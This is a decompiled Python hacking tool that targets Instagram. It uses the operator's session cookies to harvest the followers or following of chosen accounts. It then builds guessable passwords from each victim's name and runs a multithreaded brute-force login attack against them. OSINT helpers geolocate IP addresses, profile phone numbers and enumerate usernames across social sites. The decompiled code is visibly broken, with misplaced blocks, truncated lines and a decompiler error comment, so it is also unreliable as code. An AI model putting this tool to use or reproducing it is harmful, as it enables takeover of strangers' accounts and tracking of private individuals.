"""
Crack
decode by viewtech ofc
"""
global Cp  
global Loop  
global xx  
global Ok  
import json
import requests
import time
import os
import phonenumbers
from phonenumbers import carrier, geocoder, timezone
import webbrowser
import urllib.parse
from sys import stderr
import urllib.parse
from urllib.parse import quote
import re
import os
import sys
import json
import random
import urllib
import urllib.request
import hmac
import hashlib
import time
import string
import uuid
import requests
import base64
import datetime
import subprocess
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bsp
from rich.progress import Progress, TextColumn, SpinnerColumn
from string import *
from time import sleep
xx = 0
rr = random.randint
rc = random.choice
Uid, Uuid = ([], [])
Ok, Cp, Loop = (0, 0, 0)
P = '[97m'
I = '[30m'
A = '[90m'
K = '[33m'
V = '[1;92m'
M, K2 = (K, K)
H = '[96;1m'
M = '[1;31m'
K = '[1;33m'
J = '[1;35m'
O = '[38;2;255;127;0;1m'
C = '[0m'
N = '[0m'
getuserid = 'https://i.instagram.com/api/v1/users/web_profile_info/?username={nama!s}'
HEADERS = {'Host': 'www.instagram.com', 'x-ig-app-id': '1217981644879628', 'x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT', 'sec-ch-ua-mobile': '?1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36', 'accept': '*/*', 'x-requested-with': 'XMLHttpRequest', 'x-asbd-id': '129477', 'x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E', 'sec-fetch-site': 'same-origin', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
ua = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
userinfo = 'https://i.instagram.com/api/v1/users/{id!s}/info/'
Bl = '[30m'
Re = '[1;31m'
Gr = '[1;32m'
Ye = '[1;33m'
Blu = '[1;34m'
Mage = '[1;35m'
Cy = '[1;36m'
Wh = '[1;37m'

def find_res(kya=[]):
    try:
        if os.path.isfile('Data/OK--50.txt') is True:
            for a in open('Data/OK-50.txt', 'r').read().splitlines():
                xyz = re.findall('ds_user_id=(.*)', str(a))
                if len(xyz) == 0:
                    continue
                if xyz not in meki:
                    meki.append('ds_user_id=%s' % xyz[0])
        if os.path.isfile('Data/OK-100.txt') is True:
            for a in open('Data/OK-100.txt', 'r').read().splitlines():
                xyz = re.findall('ds_user_id=(.*)', str(a))
                if len(xyz) == 0:
                    continue
                if xyz not in meki:
                    pass  
    except:
        pass  
    pass
            else:  
                meki.append('ds_user_id=%s' % xyz[0])
    else:  
        pass  
    if len(kya) == 0:
        for kyta in kya:
            try:
                print(f'\n{P}Login: {H}{kyta}')
                uid = re.search('ds_user_id=(\\d+)', str(kyta)).group(1)
                req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies={'cookie': kyta}).json()['user']['full_name']
                open('Data/IG-login.txt', 'w').write(f'{kyta}')
                print(f'\n{P}Login sebagai : {req}')
                time.sleep(2)
                return memek
            except Exception as e:
                pass  
        print(f'\n{P}Expired: {K}{kyta}')

def Aset_Ig():
    Clear()
    login_file = 'Data/IG-login.txt'
    os.makedirs('Data', exist_ok=True)
    if os.path.isfile(login_file):
        with open(login_file, 'r') as f:
            saved_cookie = f.read().strip()
        coki = {'cookie': saved_cookie}
    else:  
        print('MASUKKAN COOKIES ANDA')
        user_cookie = input('\ncookie: ').strip()
        if user_cookie.lower() == 'res':
            user_cookie = find_res()
        coki = {'cookie': user_cookie}
    try:
        uid_match = re.search('ds_user_id=(\\d+)', coki['cookie'])
        if not uid_match:
            raise ValueError('Cookies tidak valid atau tidak berisi ds_user_id')
        uid = uid_match.group(1)
        response = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki).json()
        user_info = response.get('user', {})
        full_name = user_info.get('full_name', 'Tidak ditemukan')
        followers = user_info.get('follower_count', 0)
        with open(login_file, 'w') as f:
            pass  
    except Exception as e:
            f.write(coki['cookie'])
                Clear()
            else:  
                return (coki, full_name, followers)
    os.remove(login_file) if os.path.exists(login_file) else None
    print(f'Cookies Invalid! Gunakan Cookies yang Lain!\nError: {str(e)}')
    time.sleep(3)
    return Aset_Ig()

def is_option(func):
    def wrapper(*args, **kwargs):
        run_banner()
        func(*args, **kwargs)
    return wrapper

@is_option
def IP_Track():
    ip = input(f'{Wh}\n Enter IP target : {Gr}')
    print()
    print(f' {Wh}============= {Gr}SHOW INFORMATION IP ADDRESS {Wh}=============')
    req_api = requests.get(f'http://ipwho.is/{ip}')
    ip_data = json.loads(req_api.text)
    time.sleep(2)
    print(f'{Wh}\n IP target       :{Gr}', ip)
    print(f'{Wh} Type IP         :{Gr}', ip_data['type'])
    print(f'{Wh} Country         :{Gr}', ip_data['country'])
    print(f'{Wh} Country Code    :{Gr}', ip_data['country_code'])
    print(f'{Wh} City            :{Gr}', ip_data['city'])
    print(f'{Wh} Continent       :{Gr}', ip_data['continent'])
    print(f'{Wh} Continent Code  :{Gr}', ip_data['continent_code'])
    print(f'{Wh} Region          :{Gr}', ip_data['region'])
    print(f'{Wh} Region Code     :{Gr}', ip_data['region_code'])
    print(f'{Wh} Latitude        :{Gr}', ip_data['latitude'])
    print(f'{Wh} Longitude       :{Gr}', ip_data['longitude'])
    lat = int(ip_data['latitude'])
    lon = int(ip_data['longitude'])
    print(f'{Wh} Maps            :{Gr}', f'https://www.google.com/maps/@{lat},{lon},8z')
    print(f'{Wh} EU              :{Gr}', ip_data['is_eu'])
    print(f'{Wh} Postal          :{Gr}', ip_data['postal'])
    print(f'{Wh} Calling Code    :{Gr}', ip_data['calling_code'])
    print(f'{Wh} Capital         :{Gr}', ip_data['capital'])
    print(f'{Wh} Borders         :{Gr}', ip_data['borders'])
    print(f'{Wh} Country Flag    :{Gr}', ip_data['flag']['emoji'])
    print(f'{Wh} ASN             :{Gr}', ip_data['connection']['asn'])
    print(f'{Wh} ORG             :{Gr}', ip_data['connection']['org'])
    print(f'{Wh} ISP             :{Gr}', ip_data['connection']['isp'])
    print(f'{Wh} Domain          :{Gr}', ip_data['connection']['domain'])
    print(f'{Wh} ID              :{Gr}', ip_data['timezone']['id'])
    print(f'{Wh} ABBR            :{Gr}', ip_data['timezone']['abbr'])
    print(f'{Wh} DST             :{Gr}', ip_data['timezone']['is_dst'])
    print(f'{Wh} Offset          :{Gr}', ip_data['timezone']['offset'])
    print(f'{Wh} UTC             :{Gr}', ip_data['timezone']['utc'])
    print(f'{Wh} Current Time    :{Gr}', ip_data['timezone']['current_time'])

@is_option
def phoneGW():
    User_phone = input(f'\n {Wh}Enter phone number target {Gr}Ex [+6281xxxxxxxxx] {Wh}: {Gr}')
    default_region = 'ID'
    parsed_number = phonenumbers.parse(User_phone, default_region)
    region_code = phonenumbers.region_code_for_number(parsed_number)
    jenis_provider = carrier.name_for_number(parsed_number, 'en')
    location = geocoder.description_for_number(parsed_number, 'id')
    is_valid_number = phonenumbers.is_valid_number(parsed_number)
    is_possible_number = phonenumbers.is_possible_number(parsed_number)
    formatted_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
    formatted_number_for_mobile = phonenumbers.format_number_for_mobile_dialing(parsed_number, default_region, with_formatting=True)
    number_type = phonenumbers.number_type(parsed_number)
    timezone1 = timezone.time_zones_for_number(parsed_number)
    timezoneF = ', '.join(timezone1)
    print(f'\n {Wh}========== {Gr}SHOW INFORMATION PHONE NUMBERS {Wh}==========')
    print(f'\n {Wh}Location             :{Gr} {location}')
    print(f' {Wh}Region Code          :{Gr} {region_code}')
    print(f' {Wh}Timezone             :{Gr} {timezoneF}')
    print(f' {Wh}Operator             :{Gr} {jenis_provider}')
    print(f' {Wh}Valid number         :{Gr} {is_valid_number}')
    print(f' {Wh}Possible number      :{Gr} {is_possible_number}')
    print(f' {Wh}International format :{Gr} {formatted_number}')
    print(f' {Wh}Mobile format        :{Gr} {formatted_number_for_mobile}')
    print(f' {Wh}Original number      :{Gr} {parsed_number.national_number}')
    print(f' {Wh}E.164 format         :{Gr} {phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.E164)}')
    print(f' {Wh}Country code         :{Gr} {parsed_number.country_code}')
    print(f' {Wh}Local number         :{Gr} {parsed_number.national_number}')
    if number_type == phonenumbers.PhoneNumberType.MOBILE:
        print(f' {Wh}Type                 :{Gr} This is a mobile number')
    else:  
        if number_type == phonenumbers.PhoneNumberType.FIXED_LINE:
            print(f' {Wh}Type                 :{Gr} This is a fixed-line number')
        else:  
            print(f' {Wh}Type                 :{Gr} This is another type of number')

@is_option
def TrackLu():
    try:
        username = input(f'\n {Wh}Enter Username : {Gr}')
        results = {}
        social_media = [{'url': 'https://www.facebook.com/{}', 'name': 'Facebook'}, {'url': 'https://www.twitter.com/{}', 'name': 'Twitter'}, {'url': 'https://www.instagram.com/{}', 'name': 'Instagram'}, {'url': 'https://www.linkedin.com/in/{}', 'name': 'LinkedIn'}, {'url': 'https://www.github.com/{}', 'name': 'GitHub'}, {'url': 'https://www.pinterest.com/{}', 'name': 'Pinterest'}, {'url': 'https://www.tumblr.com/{}', 'name': 'Tumblr'}, {'url': 'https://www.youtube.com/{}', 'name': 'Youtube'}, {'url': 'https://soundcloud.com/{}', 'name': 'SoundCloud'}, {'url': 'https://www.snapchat.com/add/{}', 'name': 'Snapchat'}, {'url': 'https://www.tiktok.com/@{}', 'name': 'TikTok'}, {'url': 'https://www.behance.net/{}',
        for site in social_media:
            url = site['url'].format(username)
            response = requests.get(url)
            if response.status_code == 200:
                results[site['name']] = url
            else:  
                results[site['name']] = f'{Ye}Username not found {Ye}!'
    except Exception as e:
        pass  
    else:  
        print(f'\n {Wh}========== {Gr}SHOW INFORMATION USERNAME {Wh}==========')
        print()
        for site, url in results.items():
            print(f' {Wh}[ {Gr}+ {Wh}] {site} : {Gr}{url}')
        print(f'{Re}Error : {e}')
        return None

@is_option
def showIP():
    respone = requests.get('https://api.ipify.org/')
    Show_IP = respone.text
    print(f'\n {Wh}========== {Gr}SHOW INFORMATION YOUR IP {Wh}==========')
    print(f'\n {Wh}[{Gr} + {Wh}] Your IP Adrress : {Gr}{Show_IP}')
    print(f'\n {Wh}==============================================')

def clear():
    if os.name == 'nt':
        _ = os.system('cls')
    else:  
        _ = os.system('clear')

def call_option(opt):
    if not is_in_options(opt):
        raise ValueError('Option not found')
    for option in options:
        if option['num'] == opt:
            if 'func' in option:
                option['func']()
            else:  
                print('No function detected')

def execute_option(opt):
    try:
        call_option(opt)
        input(f'\n{Wh}[ {Gr}+ {Wh}] {Gr}Press enter to continue')
        main()
    except ValueError as e:
        print(e)
        time.sleep(2)
        execute_option(opt)
    except KeyboardInterrupt:
        print(f'\n{Wh}[ {Re}! {Wh}] {Re}Exit')
        time.sleep(2)
        exit()

def option_text():
    text = ''
    for opt in options:
        text += f"{Wh}[ {opt['num']} ] {Gr}{opt['text']}\n"
    return text

def is_in_options(num):
    for opt in options:
        if opt['num'] == num:
            return True
    else:  
        return False

def option():
    clear()
    stderr.writelines(f'{Gr}\n _____ _________________ _   _ _____ _____ \n|  _  /  ___| ___ \\ ___ \\ | | |_   _|  ___|\n| | | \\ `--.| |_/ / |_/ / | | | | | | |__  \n| | | |`--. \\ ___ \\    /| | | | | | |  __| \n\\ \\_/ /\\__/ / |_/ / |\\ \\| |_| | | | | |___ \n \\___/\\____/\\____/\\_| \\_|\\___/  \\_/ \\____/ \n                                           \n                                          \n{Wh}[ AUTHOR ]{Gr}  C O D E BY Z A X X Y D E V E N {Wh}[ + ]\n{Wh}[ INFORMASION]{Gr}  HACKING BRUTEFORCE AND TRACKING OSINT {Wh}[ + ]\n    ')
    stderr.writelines(f'\n\n\n{option_text()}')

def run_banner():
    clear()
    time.sleep(1)
    stderr.writelines(f'{Gr}\n _____ _________________ _   _ _____ _____ \n|  _  /  ___| ___ \\ ___ \\ | | |_   _|  ___|\n| | | \\ `--.| |_/ / |_/ / | | | | | | |__  \n| | | |`--. \\ ___ \\    /| | | | | | |  __| \n\\ \\_/ /\\__/ / |_/ / |\\ \\| |_| | | | | |___ \n \\___/\\____/\\____/\\_| \\_|\\___/  \\_/ \\____/ \n                                           \n                                          \n{Wh}[ AUTHOR ]{Gr}  C O D E BY Z A X X Y D E V E N {Wh}\n{Wh}[ INFORMASION]{Gr}  HACKING BRUTEFORCE AND TRACKING OSINT {Wh}\n    ')
    time.sleep(0.5)
G = '[1;32m'
Y = '[1;33m'
P = '[0m'

def install_tree():
    if os.name == 'posix':
        os.system('pkg install tree -y > /dev/null 2>&1')
install_tree()

def Clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def tree_banner():
    option()
    print(f'{G}')
    os.system('tree --charset=ascii')
    print(f'{P}')

def tree_menu():
    option()
    print(f'{G}')
    print(f'\n{Wh}[ {Gr}1 {Wh}] {Gr} BRUTEFORCE FOLLOWER')
    print(f'\n{Wh}[ {Gr}2 {Wh}] {Gr} BRUTEFORCE FOLLOWING')
    print(f'\n{Wh}[ {Gr}0 {Wh}] {Gr}HAPUS COOKIES')
    print(f'{P}')

@is_option
def Menu():
    Clear()
    option()
    aset, nama, fol = Aset_Ig()
    print(f'\n{Y}[ Code by {G}TUMMBAL DATE {Y}]\n{P}')
    print(f'{Y}[ USER: {G}{nama[:8]} {Y}; FOLLOWER: {G}{fol} {Y}]\n{P}')
    tree_menu()
    x = input(f'\n{G}Pilih 1/2/0: {P}').strip()
    if x in ['1', '01']:
        dumps(aset, True)
    else:  
        if x in ['2', '02']:
            dumps(aset, False)
            return
        if x in ['0', '00']:
            os.system('rm -rf Data/IG-login.txt')
            print(f'\n{G}Cookies berhasil dihapus!{P}')
            time.sleep(2)
            exit()
            return
        print(f'\n{Y}Pilihan tidak valid!{P}')
        time.sleep(2)
        return Menu()

def dumps(cintil, typess, xyz=[]):
    if 'csrftoken' not in str(cintil):
        try:
            memek = requests.get('https://www.instagram.com/data/shared_data/', cookies=cintil).json()
            token = memek['config']['csrf_token']
            cintil['cookie'] += ';csrftoken=%s;' % token
            except Exception as e:
                pass  
    else:  
        pass  
    print(f'\n{H}MASUKA USERNAME INSTAGRAM PUBLIK JANGAN PRIVATE ')
    users = input('MASUKIN : ').split(',')
    try:
        for y in users:
            req = requests.get(f'https://www.instagram.com/{y}/', cookies=cintil).text
            uid = re.search('\"user_id\":\"(\\d+)\"', str(req)).group(1)
            if uid not in xyz:
                xyz.append(uid)
    except:
        pass
        try:
            mode = 'followers' if typess is True else 'following'
            for kintil in xyz:
                if typess is True:
                    Graphql(True, kintil, cintil['cookie'], '')
                else:  
                    Graphql(False, kintil, cintil['cookie'], '')
    except:
        pass  
    pass
        print('')
        MetodeType()
        os.system('rm -rf Data/IG-login.txt')
        exit(f'\n{P}[{K}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {e}')
    else:  
        pass

def Graphql(typess, userid, cokie, after):
    global xx  
    api = 'https://www.instagram.com/graphql/query/'
    csr = 'variables={\"id\":\"%s\",\"first\":24,\"after\":\"%s\"}' % (userid, after)
    mek = 'query_hash=58712303d941c6855d4e888c5f0cd22f&{}'.format(csr) if typess is False else 'query_hash=37479f2b8209594dde7facb0d904896a&{}'.format(csr)
    try:
        ptk = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'cookie': cokie}
        req = requests.get(api, params=mek, headers=ptk).json()
        if 'require_login' in req:
            if len(Uuid) > 0:
                break
            exit(f'\n{P}[{K2}!{P}] Invalid Cookie')
        khm = 'edge_followed_by' if typess is True else 'edge_follow'
        for xyz in req['data']['user'][khm]['edges']:
            username = xyz['node']['username']
            xy = xyz['node']['username'] + '|' + xyz['node']['full_name']
            if xy not in Uuid:
                xx += 1
                Uuid.append(xy)
                print('\rMENGGUMPULKAN ID INSTAGRAM {}{}{}                            '.format(Gr, len(Uuid), P), end='')
                time.sleep(0.0009)
        end = req['data']['user'][khm]['page_info']['has_next_page']
        if end is True:
            after = req['data']['user'][khm]['page_info']['end_cursor']
            Graphql(typess, userid, cokie, after)
    except:
        return

def MetodeType():
    global SistemLog  
    R = '[91m'
    Y = '[93m'
    B = '[94m'
    RESET = '[0m'
    print(f'\n{Wh}[ {Gr}1 {Wh}] {Gr}START BRUTE FORCE')
    method = input(f'{G}MASUKAN{R}:{P} ')
    if method in ['01', '1']:
        SistemLog = 'www.instagram.com'
        SetCrack()
    else:  
        SistemLog = 'api.instagram.com'
        SetCrack()

def SetCrack():
    print(f'\n{Wh}[ {Gr}! {Wh}] {Gr}MODPES ON/OFF 100 ID')
    with ThreadPoolExecutor(max_workers=30) as ASF:
        for i in Uuid:
            try:
                username, name = i.split('|')
                kontol = Password(name)
                if SistemLog == 'www.instagram.com':
                    ASF.submit(Crack_w, username, kontol)
            except:
                pass
    exit(' \n\n Brute force selesai hasil di simpan di folder ress')

def Password(name):
    xxzx, ccvc = ([], [])
    for nama in name.split(' '):
        nama = nama.lower()
        if not len(nama) < 3:
            if len(nama) == 3 or len(nama) == 4 or len(nama) == 5:
                xxzx.append(nama + '12')
                xxzx.append(nama + '321')
                xxzx.append(nama + '123')
                xxzx.append(nama + '1234')
                xxzx.append(nama + '12345')
                xxzx.append(nama + '123456')
                xxzx.append(nama + '12345789')
                xxzx.append(nama + '01')
                xxzx.append(nama + '04')
                xxzx.append(nama + '05')
                xxzx.append(nama + '07')
                xxzx.append(nama + '08')
                xxzx.append(nama + '09')
                xxzx.append(nama + '15')
                xxzx.append(nama + '17')
                xxzx.append(nama + '18')
                xxzx.append(nama + '19')
                xxzx.append(nama + '24')
                xxzx.append(nama + '28')
            else:  
                xxzx.append(nama + '12')
                xxzx.append(nama + '321')
                xxzx.append(nama + '123')
                xxzx.append(nama + '1234')
                xxzx.append(nama + '12345')
                xxzx.append(nama + '123456')
                xxzx.append(nama + '12345789')
                xxzx.append(nama + '01')
                xxzx.append(nama + '04')
                xxzx.append(nama + '05')
                xxzx.append(nama + '07')
                xxzx.append(nama + '08')
                xxzx.append(nama + '09')
                xxzx.append(nama + '15')
                xxzx.append(nama + '17')
                xxzx.append(nama + '18')
                xxzx.append(nama + '19')
                xxzx.append(nama + '24')
                xxzx.append(nama + '28')
    return xxzx

def convert_cookie(item):
    try:
        sesid = 'sessionid=' + re.findall('sessionid=(\\d+)', str(item))[0]
        ds_id = 'ds_user_id=' + re.findall('ds_user_id=(\\d+)', str(item))[0]
        csrft = 'csrftoken=' + re.findall('csrftoken=(.*?);', str(item))[0]
        donez = '%s;%s;%s;ig_nrcb=1;dpr=2' % (ds_id, sesid, csrft)
    except Exception as e:
        pass  
    else:  
        return donez
        donez = 'cookies tidak di temukan, error saat convert'
ses = requests.Session()

def data_target(name):
    for y in name.split(','):
        try:
            HEADERS.update({'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)', 'x-ig-app-id': '1217981644879628'})
            profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers=HEADERS).json()['data']['user']
            post = profil_info_target['edge_owner_to_timeline_media']['count']
            peng = profil_info_target['edge_followed_by']['count']
            meng = profil_info_target['edge_follow']['count']
            mail = profil_info_target['business_email']
            phone = profil_info_target['business_phone_number']
            fullname = profil_info_target['full_name']
            fbid = profil_info_target['fbid']
        except Exception as e:
            pass  
    else:  
        return (post, peng, meng, mail, fullname, fbid, phone)
        post, peng, meng, mail, fullname, fbid, phone = (None, None, None, None, None, None, None)

def Android_Version(android_version):
    if str(android_version) == '9':
        return '28'
    if str(android_version) == '10':
        return '29'
    if str(android_version) == '11':
        return '30'
    if str(android_version) == '12':
        return '31'
    return '32'

def UserAgentBarcelona():
    dpis = random.choice(['320dpi', '640dpi', '213dpi', '480dpi', '420dpi', '240dpi', '280dpi', '160dpi', '560dpi', '540dpi', '272dpi', '360dpi', '720dpi', '270dpi', '450dpi', '600dpi', '279dpi', '210dpi', '180dpi', '510dpi', '300dpi', '454dpi', '314dpi', '288dpi', '401dpi', '153dpi', '267dpi', '345dpi', '493dpi', '340dpi', '604dpi', '465dpi', '680dpi', '256dpi', '290dpi', '432dpi', '273dpi', '120dpi', '200dpi', '367dpi', '419dpi', '306dpi', '303dpi', '411dpi', '195dpi', '518dpi', '230dpi', '384dpi', '315dpi', '293dpi',
    android_version = random.choice(['24/7.0', '26/8.0.0', '23/6.0.1', '22/5.1.1', '21/5.0.1', '21/5.0.2', '25/7.1.1', '19/4.4.4', '21/5.0', '19/4.4.2', '27/8.1.0', '28/9', '29/10', '26/9', '29/10', '30/11', '25/7.1.2'])
    language = random.choice(['ru_RU', 'en_GB', 'uk_UA', 'en_US', 'de_DE', 'it_IT', 'ru_UA', 'ar_AE', 'tr_TR', 'lv_LV', 'th_TH', 'fr_FR', 'sr_RS', 'hu_HU', 'bg_BG', 'pt_PT', 'pt_BR', 'es_ES', 'en_IE', 'nl_NL', 'fr_CH', 'de_CH', 'es_US', 'fr_CA', 'ru_BY', 'en_PH', 'en_AU', 'hy_AM', 'fa_IR', 'de_AT', 'cs_CZ', 'ru_KZ', 'en_CA', 'fr_BE', 'az_AZ', 'en_NZ', 'en_ZA', 'es_LA', 'ru_KG', 'pl_PL', 'es_MX', 'ro_RO', 'el_GR', 'iw_IL', 'in_ID', 'ga_IE', 'en_IN', 'ar_SA', 'ka_GE', 'es_CO',
    pxl = random.choice(['720x1280', '1440x2560', '1440x2768', '1280x720', '1280x800', '1080x1920', '540x960', '1080x2076', '1080x2094', '1080x2220', '480x800', '768x1024', '1440x2792', '1200x1920', '720x1384', '1920x1080', '720x1369', '800x1280', '720x1440', '1080x2058', '600x1024', '720x1396', '2792x1440', '1920x1200', '2560x1440', '1536x2048', '720x1382'])
    '''Decompiler error: line too long for translation. Please decompile this statement manually.'''
    igv = '42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.